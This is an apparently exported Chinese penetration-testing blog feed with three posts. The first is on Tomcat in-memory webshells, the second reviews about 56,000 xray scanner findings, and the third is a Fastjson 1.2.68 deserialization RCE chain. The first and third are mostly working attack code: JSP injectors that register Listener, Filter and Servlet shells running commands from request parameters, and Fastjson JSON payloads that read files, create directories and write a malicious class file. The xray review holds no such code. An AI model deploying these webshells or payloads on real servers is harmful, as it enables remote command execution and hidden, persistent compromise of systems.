&lt;%@ page import="java.io.IOException" %&gt;
&lt;%@ page import="org.apache.catalina.core.StandardContext" %&gt;
&lt;%@ page import="org.apache.catalina.connector.Request" %&gt;
&lt;%@ page import="java.io.InputStream" %&gt;
&lt;%@ page import="java.util.List" %&gt;
&lt;%@ page import="java.util.Arrays" %&gt;
&lt;%@ page import="java.util.ArrayList" %&gt;


&lt;%
    class ListenerMemShell implements ServletRequestListener {
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            String command = req.getParameter("listenershell");
            if (command != null) {
                try {
                    InputStream in = Runtime.getRuntime().exec(command).getInputStream();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }
        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%&gt;

&lt;%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();

    Object[] objects = context.getApplicationEventListeners();
    List&lt;Object&gt; listeners = Arrays.asList(objects);
    List&lt;Object&gt; listenershelllist = new ArrayList(listeners);
    ListenerMemShell listenershell = new ListenerMemShell();
    listenershelllist.add(listenershell);
    context.setApplicationEventListeners(listenershelllist.toArray());

%&gt;

访问jsp即注入成功后，任意路由?listenershell=command即可执行命令。
Filter内存马  创建一个恶意Filter，恶意代码写再doFilter里：
public class FilterShell implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("filter初始化");
    }
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String command1 = request.getParameter("cmd1");
        if (command1 != null) {
            try {
                InputStream in = Runtime.getRuntime().exec(command1).getInputStream();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        chain.doFilter(request, response);
    }
    @Override
    public void destroy() {

    }

}

在web.xml里配置：
&lt;filter&gt;
    &lt;filter-name&gt;FilterShell&lt;/filter-name&gt;
    &lt;filter-class&gt;com.Filter.FilterShell&lt;/filter-class&gt;
&lt;/filter&gt;
&lt;filter-mapping&gt;
    &lt;filter-name&gt;FilterShell&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;
&lt;/web-app&gt;

在正式调试之前，有几个类需要简单知道一下：
FilterDef 存储过滤器名filterName，过滤器实例filterClass，url 等基本信息
FilterConfigs存储当前上下文信息StandardContext、FilterDef 和 Filter对象等信息
FilterMaps 中主要存放了 FilterName 以及对应的URLPattern
FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter

我们在doFilter处下断点，访问路由，查看调用栈：
doFilter:15, FilterShell (com.Filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:541, AuthenticatorBase (org.apache.catalina.authenticator)
......

我们看下ApplicationFilterChain：
   private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {
        if (this.pos &lt; this.n) {
            ApplicationFilterConfig filterConfig = this.filters[this.pos++];

            try {
                Filter filter = filterConfig.getFilter();
                if (request.isAsyncSupported() &amp;&amp; "false".equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) {
                    request.setAttribute("org.apache.catalina.ASYNC_SUPPORTED", Boolean.FALSE);
                }

                if (Globals.IS_SECURITY_ENABLED) {
                    Principal principal = ((HttpServletRequest)request).getUserPrincipal();
                    Object[] args = new Object[]{request, response, this};
                    SecurityUtil.doAsPrivilege("doFilter", filter, classType, args, principal);
                } else {
                    filter.doFilter(request, response, this);
                }

            } catch (ServletException | RuntimeException | IOException var15) {
                throw var15;
            } catch (Throwable var16) {
                Throwable e = ExceptionUtils.unwrapInvocationTargetException(var16);
                ExceptionUtils.handleThrowable(e);
                throw new ServletException(sm.getString("filterChain.filter"), e);
            }
        } else {
            try {
                if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                    lastServicedRequest.set(request);
                    lastServicedResponse.set(response);
                }

                if (request.isAsyncSupported() &amp;&amp; !this.servletSupportsAsync) {
                    request.setAttribute("org.apache.catalina.ASYNC_SUPPORTED", Boolean.FALSE);
                }

                if (request instanceof HttpServletRequest &amp;&amp; response instanceof HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) {
                    Principal principal = ((HttpServletRequest)request).getUserPrincipal();
                    Object[] args = new Object[]{request, response};
                    SecurityUtil.doAsPrivilege("service", this.servlet, classTypeUsedInService, args, principal);
                } else {
                    this.servlet.service(request, response);
                }
            } catch (ServletException | RuntimeException | IOException var17) {
                throw var17;
            } catch (Throwable var18) {
                Throwable e = ExceptionUtils.unwrapInvocationTargetException(var18);
                ExceptionUtils.handleThrowable(e);
                throw new ServletException(sm.getString("filterChain.servlet"), e);
            } finally {
                if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                    lastServicedRequest.set((Object)null);
                    lastServicedResponse.set((Object)null);
                }

            }

        }
    }

我们可以看到通过filter.doFilter(request, response, this);来调用了doFilter，然后再向前看如何获得fiter：Filter filter = filterConfig.getFilter(); 前面已经简单说过了filterConfigs是什么了，一个filterConfig是一个ApplicationFilterConfig的实现类，在ApplicationFilterChain中：
    private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];

是将值传入，那么需要知道在哪初始化ApplicationFilterChain；在StandardWrapperValve#invoke中：
        ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);

跟进createFilterChain，需要关注StandardContext、filterChain、FilterMaps、FilterConfig这些的操作。代码通过
StandardContext context = (StandardContext)wrapper.getParent();

来获取当前的StandardContext，并通过
FilterMap[] filterMaps = context.findFilterMaps();

来获得filterMap，通过filter名字得到对应的filterConfig：
filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());

最后通过
filterChain.addFilter(filterConfig);

加入到filterChain中，，思路比较清晰，只要知道如何将我们想要的Filter信息添加到filterConfigs中，就可以添加到filterChain，从而触发。直接看debug信息可能直观一点：跟刚开始介绍的一样，filterDef需要对应的filter、filterName、FilterClass；filterMaps则需要filterName、urlPattern、dispatcherMapping。还有一点是获得StandardContext，有许多资源可以加以利用，方法很多，简单写两种大佬的demo：
//获取ApplicationContextFacade类
ServletContext servletContext = request.getSession().getServletContext();
 
//反射获取ApplicationContextFacade类属性context为ApplicationContext类
Field appContextField = servletContext.getClass().getDeclaredField("context");
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
 
//反射获取ApplicationContext类属性context为StandardContext类
Field standardContextField = applicationContext.getClass().getDeclaredField("context");
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

或者
    //获取servletContext
    ServletContext servletContext = request.getSession().getServletContext();
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
    Field applicationContextFacadeContext = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeContext.setAccessible(true);
    //获取applicationContext
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);
    Field applicationContextContext = applicationContext.getClass().getDeclaredField("context");
    applicationContextContext.setAccessible(true);
    //获取standardContext
    StandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);

然后就是注入jsp的代码了：
&lt;%@ page import="java.io.IOException" %&gt;
&lt;%@ page import="java.lang.reflect.Field" %&gt;
&lt;%@ page import="org.apache.catalina.core.ApplicationContext" %&gt;
&lt;%@ page import="org.apache.catalina.core.StandardContext" %&gt;
&lt;%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %&gt;
&lt;%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %&gt;
&lt;%@ page import="java.lang.reflect.Constructor" %&gt;
&lt;%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %&gt;
&lt;%@ page import="org.apache.catalina.Context" %&gt;
&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;
&lt;%@ page import="org.apache.catalina.connector.Request" %&gt;
&lt;%@ page import="org.apache.catalina.core.ApplicationContextFacade" %&gt;
&lt;%@ page import="java.util.HashMap" %&gt;


&lt;%

    class FIlterShell implements Filter {

        public void init(FilterConfig filterConfig) throws ServletException {
            System.out.println("filter初始化");
        }

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String FilterShell = request.getParameter("FilterShell");
        if (FilterShell != null) {
            try {
                Runtime.getRuntime().exec(FilterShell);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        chain.doFilter(request, response);
    }
        public void destroy() {

        }



}
    ServletContext servletContext = request.getServletContext();
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
    Field applicationContextFacadeContext = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeContext.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);
    Field applicationContextContext = applicationContext.getClass().getDeclaredField("context");
    applicationContextContext.setAccessible(true);
    StandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);

    FIlterShell filter = new FIlterShell();
    String FiterName = "FilterMemShell";
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(FiterName);
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);


    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(FiterName);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);


    Field Config = standardContext.getClass().getDeclaredField("filterConfigs");
    Config.setAccessible(true);
    HashMap filterConfigs = (HashMap) Config.get(standardContext);



    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
    filterConfigs.put(FiterName, filterConfig);
%&gt;

  不管获得StandardContext还是添加filterConfigs其实都有不少的代码实现，但思路大概差不太多，这里只是写一种方法。
Servlet内存马  在开始时看到有师傅用两个接口来实现内存马，分别是Servlet和HttpServlet，HttpServlet在Servlet的基础上添加了HTTP协议的处理方法，不在直接使用Servlet的service方法，而是对于Http的不同请求，分别调用doGet和doPost方法。虽然接口不同，但调用到底层差不多，这里选择实现HttpServlet来分析。编写Servlet恶意类：
public class ServletShell extends HttpServlet{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String command2 = req.getParameter("cmd2");
        if (command2 != null) {
            try {
                InputStream in = Runtime.getRuntime().exec(command2).getInputStream();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
    }


    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doGet(req, resp);
    }

}

在web.xml注册：
    &lt;servlet&gt;
        &lt;servlet-name&gt;ServletShell&lt;/servlet-name&gt;
        &lt;servlet-class&gt;com.Servlet.ServletShell&lt;/servlet-class&gt;
    &lt;/servlet&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;ServletShell&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;

这次在ContextConfig#webconfig打断点，此方法的主要作用在于读取web.xml以及其他配置操作，可以较为形象的跟踪servlet的读取过程。查看调用栈：
webConfig:1264, ContextConfig (org.apache.catalina.startup)
configureStart:986, ContextConfig (org.apache.catalina.startup)
lifecycleEvent:303, ContextConfig (org.apache.catalina.startup)
fireLifecycleEvent:123, LifecycleBase (org.apache.catalina.util)
startInternal:5135, StandardContext (org.apache.catalina.core)
start:183, LifecycleBase (org.apache.catalina.util)
addChildInternal:726, ContainerBase (org.apache.catalina.core)
addChild:698, ContainerBase (org.apache.catalina.core)
addChild:696, StandardHost (org.apache.catalina.core)
manageApp:1783, HostConfig (org.apache.catalina.startup)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
......

里面的fireLifecycleEvent解析调用了web.xml内容
    protected void fireLifecycleEvent(String type, Object data) {
        LifecycleEvent event = new LifecycleEvent(this, type, data);
        Iterator var4 = this.lifecycleListeners.iterator();

        while(var4.hasNext()) {
            LifecycleListener listener = (LifecycleListener)var4.next();
            listener.lifecycleEvent(event);
        }

    }

从而webconfig调用此解析内容进行配置，将内容通过configureContext来创建StandWrapper
            if (this.ok) {
                this.configureContext(webXml);
            }
        } else {
            webXml.merge(tomcatWebXml);
            webXml.merge(defaults);
            this.convertJsps(webXml);
            this.configureContext(webXml);
        }

在后面通过：
this.context.addServletMappingDecoded(urlPattern, jspServletName, true);

进行url路径的添加，因为加载顺序是Listener-&gt;Filter-&gt;Servlet，所以还要之间还要对Listener，Filter进行加载，到后由loadOnStartup加载之前的wrapper，其中有一个判断需要注意下：
            if (loadOnStartup &gt;= 0) {
                Integer key = loadOnStartup;
                ArrayList&lt;Wrapper&gt; list = (ArrayList)map.get(key);
                if (list == null) {
                    list = new ArrayList();
                    map.put(key, list);
                }

                list.add(wrapper);
            }

也就是说loadOnStartup大于等于0才会进行后续的操作（其实设置为0也不会进行），这个属性默认-1，表示启动的优先级，往后就成功加载了Servlet了。其中configureContext在创建Wrapper时规定了几个必要的属性：
LoadOnStartup属性：
wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
ServletName属性：
wrapper.setName(servlet.getServletName());
ServletClass属性：
wrapper.setServletClass(servlet.getServletClass());

那我们加载的代码逻辑就在创建wrapper后，分别设置LoadOnStartup属性、ServletName属性以及ServletClass属性，最后通过addChild以及addServletMappingDecoded进行加载到对应路径，完整代码如下：
&lt;%@ page import="java.lang.reflect.Field" %&gt;
&lt;%@ page import= "javax.servlet.ServletException" %&gt;
&lt;%@ page import="org.apache.catalina.core.StandardContext" %&gt;
&lt;%@ page import="org.apache.catalina.connector.Request" %&gt;
&lt;%@ page import="java.io.IOException" %&gt;
&lt;%@ page import="org.apache.catalina.Wrapper" %&gt;
&lt;%@ page import="java.io.InputStream" %&gt;
&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;

&lt;%
     class ServletShell extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String command = req.getParameter("servletshell");
            if (command != null) {
                try {
                    InputStream in = Runtime.getRuntime().exec(command).getInputStream();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }


         @Override
         protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
             doGet(req, resp);
         }

    }

    ServletShell shellservlet = new ServletShell();
    String servletname = shellservlet.getClass().getSimpleName();

    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();


    Wrapper wrappershell = standardContext.createWrapper();

    wrappershell.setServlet(shellservlet);

    wrappershell.setLoadOnStartup(1);
    wrappershell.setName(servletname);
    wrappershell.setServletClass(shellservlet.getClass().getName());

    standardContext.addChild(wrappershell);
    standardContext.addServletMappingDecoded("/*",servletname);
%&gt;

小结  这里只介绍了最基本的几种内存马，对于spring默认不解析jsp的有其他的利用方式，而且字节注入内存马和其他骚操作也有很广的利用场景，不少师傅也挖到了利用链，但在实战中写内存马一定要注意路径匹配问题，一旦把路由弄乱，影响测试方的正常业务，那就糟糕了。
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>对Xray 5.6W条结果的简单分析</title>
    <url>//post/Xray%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90.html</url>
    <content><![CDATA[对Xray 5.6W条结果的简单分析
前言自动化扫描src已经做一段时间了，各类问题累计扫出来7.3w+，其中xray作为扫描漏洞的主力之一，上报了5.6w+问题 。目前应该是全网使用xray漏洞记录最多的一个了吧。
这里便根据这5.6w+扫描结果来对xray做一个简单的分析及复盘，先说下我目前使用方式:
扫描目标

各大国内src相关资产

扫描方式

crawlgergo爬取网站请求并发送到xray
xray扫描爬取的网站请求将结果发送给webhook
webhook收集并报告漏洞

简单来说就是: crawlgergo—-&gt;xray—-&gt;webhook
开局套个盾

统计结果仅包含src的资产，一般有src厂商的网站安全性要比普通厂商的安全性要高出很多，不同src对应厂商的安全性也不相同，分析结果仅供娱乐，不代表某个具体公司，亦不代表整体情况。
随着扫描结果越来越多，后续根据我的扫描习惯关闭了一些误报过高和没有太大利用价值的插件，所以对于对于一些插件的统计结果是偏低的。
本次取的是xray直接的报告结果，其中包含了xray的误报。

正片本次统计漏洞总数为56666，这里将漏洞分为xray内置插件扫描和加载yaml插件扫描两类，其中

内置插件漏洞数量：54507
yaml插件漏洞数量：2159

xray自带插件分析xray自带插件可以分为10个大类

dirscan
baseline
xss
redirect
brute-force
sqldet
jsonp
path-traversal
cmd-injection
crlf-injection

细分总计有60个小类（ps:实际不止60，这里取的是报告结果统计出来的分类），具体如下

对整体漏洞统计如下
dirscan和baseline远高于其他插件，下面具体说说各类漏洞的情况及使用体验
baselinebaseline下面具体说说各类漏洞的情况及使用体验

baseline/cors/allow-https-downgrade/cors/allow-https-downgrade/cors/allow-https-downgrade
baseline/cors/allow-null-with-credential
baseline/cors/any-origin-with-credential
baseline/cors/reflected
baseline/sensitive/server-error

其中server-error最多，达到20711条。baseline对自动化挖src来说，没有太多价值，为了减少干扰，后来直接在配置文件关掉这个大类检测，所以这块的实际统计是偏少的。
dirscan感觉xray花了大量精力来做这个插件，直接分了45个小类，漏洞种类它占了三分之一
由于分的太细，有些漏洞名字完全不知道干嘛的，这里根据具体的报告做了个简单的记录

导致dirscan数量偏高的主要是以下4个插件，总计22971个。

dirscan/debug/readme
dirscan/sourcemap/default
dirscan/sensitive/crossdomain
dirscan/directory/default

第一个第三个价值不大
第二个是js.map泄漏，第四个是目录遍历，由于xray没做相关去重，一个网站有问题，那么连带着可能报上来几十甚至上百条报告。
仔细梳理下来，dirscan细分了很多类，其实有些是相似的，可以合并到一起，分成两级其实更简洁明了。
diarscan中实际可直接利用的并不多，可以把其中的一些高价值或命中高价值关键字的漏洞做一些醒目的提醒，减少干扰。比如目录遍历的文件可进一步读取。泄漏密码或者其他重要配置。
部分插件可以做进一步扫描的，比如发现phpmyadmin和tomcat可以尝试爆破。
git/svn插件误报有点多。
sqldetsql注入检测插件

sqldet/blind-based/default
sqldet/error-based/default
sqldet/time-based/default

报错注入，bool盲注，时间盲注都有检测。
实际使用中扫出来过报错注入，在本地扫描的时候扫出来过被我漏掉的时间盲注。
但是bool盲注，时间盲注在这套自动化测试流程中全是误报，而且误报特别多，后来直接关闭这俩检测，只保留了报错注入。
xss基于语义化检测的检测逻辑，检测过程无明显流量特征，对于有防护的场景依然有很高的准确度。
最开始的时候手工验证了很多报告，很多防御不严谨的都被识别出来了，基本上绕一下就能触发xss，算得上扫xss神器。
可惜是国内的xss，还是反射型xss，有的还有条件限制。即时交了给的赏金还不够写报告的手工费。后来扫出来的越来越多，也懒得挨个看了，现在默认忽略xss漏洞。
redirect检测payload设计的挺巧妙的，payload自带绕过能力，精确度也挺高。
可惜不值钱，也被我当做默认忽略的漏洞之一了。
brute-force
brute-force/basic-auth/default
brute-force/form-brute/default

这个模块，基本都是误报= =.
basic-auth报告3个全是误报，form-brute报告378条具体正确多少个忘记了，但不超过5个，这个插件怎么说呢，关掉吧，万一命中一个说不准就是个高危漏洞，不关吧，命中率实在感人，自己写一个吧，不经过大量测试写出来的命中率估计还不如这个呢。。
jsonp扫出来的结果并不多，且利用价值都不高。纯依靠插件来检测这类漏洞中高价值的还是有点难度的。
cmd-injection、crlf-injection、path-traversal这三个的报告很少，而且报上来的也是全是误报。
xray加载的yaml插件分析
在写这篇文章前的印象是除了两三个特别容易误报的插件外，其他插件相对较好的。然而在写这篇文章的时候重新整理了一下这些结果，发现这里面的误报真的多，很多插件直接全是误报。。。这里直接不展开分析了。

简单说一下结果：
yaml插件总计352个，有报告漏洞的插件共36个。
将插件根据发现漏洞数量排序，原本想挑几个效果比较好的插件分析下的，结果发现好多插件插件误报率百分百，一直找到第20个才凑齐10个，直接放弃。（ps:这里说的是误报不是漏报，造成原因是目前扫描的目标里面没有这些漏洞。）
这里放个排除掉误报比较高的插件后的前十插件占比。

yaml插件估计是官方在审核插件的时候只是审核插件是否会漏报，并没有进行大范围的测试。
后记最后简单总结下在这段时间使用下来后对于xray的评价
先说优势

在基础普通漏洞验证上做的相对完善。部分类型的漏洞验证方式及思路非常巧妙。
支持额外加载yaml插件来补充其对1day漏洞的扫描能力
有官方运营的社区，可不断补充1day插件

然后缺点

编译型语言的导致的硬伤，不如脚本语言灵活。只能通过解析yaml文件来进行poc编写，但yaml在应对复杂场景的检测局限性很大。
针对新的影响范围较广的漏洞等的补充只能等待官方更新，比如log4j到目前都没有支持。
不支持被动扫描插件编写。
用于大范围扫描时很多插件误报严重。

在最初了解到基于流量的被动扫描时就感觉这是个很好的漏洞扫描思路，能做的事情应该远高于传统扫描器。
xray作为最火的被动扫描，在长时间使用下来的体验是相比传统扫描器有一定特色，除具备传统扫描器功能外，也有一定的灵活性。
但由于其不开源，开放出来的版本本质还是基于传统漏洞和僵硬的1day扫描，无法完成被动扫描插件的开发，没有将被动扫描真正的灵活性完全的体现出来。想要完全发挥被动扫描的能力仍然需要配合其他的被动扫描工具。
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>Fastjson 1.2.80调试小记</title>
    <url>//post/fastjson%201.2.80%E8%B0%83%E8%AF%95%E5%B0%8F%E8%AE%B0.html</url>
    <content><![CDATA[fastjson 1.2.68 反序列化rce探索前言  fastjson 1.2.68 目前公开的利用链中比较好用的是voidfyoo师傅的Commons IO 写文件链子，但是在spring环境下，仅仅通过写文件rce较为困难，本文更多的是结合多位师傅的文章理出一条通过写文件稳定rce方法
JDK8任意文件写场景下的Fastjson RCE  通过覆盖charsets.jar缺点太多，一是文件大，二是java版本不适配。另外笔者觉得还有一个致命因素，一般来说项目中只要使用了Charset.forName 就会加载charsets.jar，这样来讲正常的业务代码中几乎都已经加载过charsets.jar，即使后来再覆盖charsets.jar也不会重新加载。仅为笔者个人（java初学者）想法（或许是在哪里看到过别的师傅的文章，有点印象），如有错误欢迎师傅指点。
  threedr3am师傅给出了任意文件写的情况下，如何更稳定地rce。简单来讲如果写一个恶意的class到jre/classes/目录下，class内容如下：
import java.io.IOException;

public class MyClass implements AutoCloseable {
    public MyClass(String cmd) throws IOException {
        Runtime.getRuntime().exec(cmd);
    }

    public void close() throws Exception {
    }

    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException var1) {
            throw new RuntimeException(var1);
        }
    }
}

  正在运行的项目会加载这个class文件，我们只需要使用如下poc即可rce。
{"@type":"java.lang.AutoCloseable","@type":"MyClass","cmd":"open -a Calculator"}

  这里只做简述，具体原理到threedr3am师傅的博客中查看。
  很可惜的是jre目录下默认并不会存在classes目录，另外voidfyoo师傅给出的Commons IO 写文件链子不能写二进制文件，具体原因是使用的输入输出流都是经过编码的，而二进制文件中部分字符编码/解码失败就会写入脏字符。那么目前我们需要解决的问题有三点：

获取jdk目录
创建classes目录
写入class文件

获取jdk目录  在Blackhat的议题中分享了一条commons-io逐字节读文件的链子，但是局限性很大。经过浅蓝师傅的扩展，目前可以做到有抛出异常的布尔读和利用dnslog 无回显读 ,贴一下浅蓝师傅的有抛出异常的布尔读取文件的poc：
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///tmp/test"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [
          98
        ]
      }
    ]
  },
  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}
}

  当字节码对比一致时就会走到下面charSequence处，因为类型不一致fastjson报错，业务抛出异常，字节码对比不一致时返回为null，fastjson也就不会报错，业务回显正常。我们可以直接读取启动命令 /proc/self/cmdline， 有的时候直接是用绝对路径来启动的，如果不是可以用netdoc协议列目录找到jdk路径
创建classes目录  笔者找到一条简单的通过Commons IO创建目录的链子，使用的类是org.apache.commons.io.output.LockableFileWriter
public LockableFileWriter(File file, Charset encoding, boolean append, String lockDir) throws IOException {
        file = file.getAbsoluteFile();
        if (file.getParentFile() != null) {
            FileUtils.forceMkdir(file.getParentFile());
        }

        if (file.isDirectory()) {
            throw new IOException("File specified is a directory");
        } else {
            if (lockDir == null) {
                lockDir = System.getProperty("java.io.tmpdir");
            }

            File lockDirFile = new File(lockDir);
            FileUtils.forceMkdir(lockDirFile);
            this.testLockDir(lockDirFile);
            this.lockFile = new File(lockDirFile, file.getName() + ".lck");
            this.createLock();
            this.out = this.initWriter(file, encoding, append);
        }
    }


FileUtils#forceMkdir


public static void forceMkdir(File directory) throws IOException {
        ......
        if (directory.exists()) {
            ......
        } else if (!directory.mkdirs() &amp;&amp; !directory.isDirectory()) {
          ......
        }

    }

poc
{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.output.WriterOutputStream",
 "writer":{
 "@type":"org.apache.commons.io.output.LockableFileWriter",
 "file":"/etc/passwd", //一个存在的文件
 "encoding":"UTF-8",
 "append": true,
"lockDir":"/usr/lib/jvm/java-8-openjdk-amd64/jre/classes" //要创建的目录
 },
 "charset":"UTF-8",
 "bufferSize": 8193,
 "writeImmediately": true
 }

  file需要是一个存在的文件，才能走到下面的FileUtils.forceMkdir(lockDirFile) 创建目录注：mac环境下可能有保护机制，jre下classes创建不了，实测ubuntu上是可以创建的。
写入class文件  笔者能力有限，只依赖commons-io 未能找到一条写二进制文件的链子，在Blackhat的议题中分享了一条基于commons-io、commons-codec、aspectj写二进制文件的链，笔者近日打的fastjson刚好有commons-io、commons-codec，但是没有aspectj。于是在另一位师傅列出lib之后，在ant中找到了org.apache.tools.ant.util.LazyFileOutputStream 类，可以替代aspectj中的org.eclipse.core.internal.localstore.SafeFileOutputStream
public static void write_so(String target_path) throws IOException {
    byte[] bom_buffer_bytes = readFileInBytesToString("./target/classes/MyClass.class");
    String base64_so_content = Base64.getEncoder().encodeToString(bom_buffer_bytes);
    byte[] big_bom_buffer_bytes = Base64.getDecoder().decode(base64_so_content);
    String payload = String.format("{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\n" +
                "  \"delegate\":{\n" +
                "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "    \"input\":{\n" +
                "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\n" +
                "      \"in\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\n" +
                "        \"charset\":\"utf-8\",\n" +
                "        \"bufferSize\": 1024,\n" +
                "        \"cs\":{\"@type\":\"java.lang.String\"\"%1$s\"\n" +
                "      },\n" +
                "      \"doEncode\":false,\n" +
                "      \"lineLength\":1024,\n" +
                "      \"lineSeparator\":\"5ZWKCg==\",\n" +
                "      \"decodingPolicy\":0\n" +
                "    },\n" +
                "    \"branch\":{\n" +
                //"      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                //"      \"targetPath\":\"%2$s\"\n" +
                "      \"@type\":\"org.apache.tools.ant.util.LazyFileOutputStream\",\n" +
                "      \"file\":\"%2$s\",\n" +
                "      \"append\":false,\n" +
                "      \"alwaysCreate\":true\n" +
                "    },\n" +
                "    \"closeBranch\":false\n" +
                "  },\n" +
                "  \"include\":true,\n" +
                "  \"boms\":[{\n" +
                "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "                  \"charsetName\": \"UTF-8\",\n" +
                "                  \"bytes\":" +"%3$s\n" +
                "                }],\n" +
                "  \"x\":{\"$ref\":\"$.bOM\"}\n" +
                "}",base64_so_content, "/tmp/MyClass.class", Arrays.toString(big_bom_buffer_bytes));
    System.out.println(payload);
}
public static byte[] readFileInBytesToString(String filePath) {
        final int readArraySizePerRead = 4096;
        File file = new File(filePath);
        ArrayList&lt;Byte&gt; bytes = new ArrayList&lt;&gt;();
        try {
            if (file.exists()) {
                DataInputStream isr = new DataInputStream(new FileInputStream(
                        file));
                byte[] tempchars = new byte[readArraySizePerRead];
                int charsReadCount = 0;

                while ((charsReadCount = isr.read(tempchars)) != -1) {
                    for(int i = 0 ; i &lt; charsReadCount ; i++){
                        bytes.add (tempchars[i]);
                    }
                }
                isr.close();
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        return toPrimitives(bytes.toArray(new Byte[0]));
    }

    static byte[] toPrimitives(Byte[] oBytes) {
        byte[] bytes = new byte[oBytes.length];

        for (int i = 0; i &lt; oBytes.length; i++) {
            bytes[i] = oBytes[i];
        }

        return bytes;
    }

